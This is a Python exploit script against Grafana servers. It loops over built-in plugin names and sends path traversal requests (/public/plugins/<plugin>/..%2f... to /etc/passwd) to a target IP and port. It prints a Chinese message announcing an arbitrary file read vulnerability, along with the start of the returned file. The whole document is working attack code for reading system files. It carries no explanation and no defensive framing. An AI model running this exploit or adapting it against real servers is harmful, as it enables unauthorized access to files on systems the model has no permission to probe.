import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument(action='store', dest="IP", type=str,help="python3 Grafana.py ip port")
parser.add_argument(action='store', dest="PORT", type=str,help="python3 Grafana.py ip port")

plugins = ["alertmanager", "grafana", "loki", "postgres", "grafana-azure-monitor-datasource", \
           "mixed", "prometheus", "cloudwatch", "graphite", "mssql", "tempo", "dashboard", "influxdb", \
           "mysql", "testdata", "elasticsearch", "jaeger", "opentsdb", "zipkin", "alertGroups", "bargauge", \
           "debug", "graph", "live", "piechart", "status-history", "timeseries", "alertlist", "gauge", "heatmap", \
           "logs", "pluginlist", "table", "welcome", "annolist", "canvas", "geomap", "histogram", "news", \
           "stat", "table-old", "xychart", "barchart", "dashlist", "gettingstarted", "nodeGraph", "state-timeline",
           "text"]
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
}

for plugin in plugins:
    url = "http://" + parser.parse_args().IP + ":" + parser.parse_args().PORT + "/public/plugins/" + plugin + "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    response = requests.get(url= url, headers= headers)
    str = "root"
    if response.text[0] in str:
        print("存在Grafana任意文件读取漏洞.")
        print(response.text[0:31])
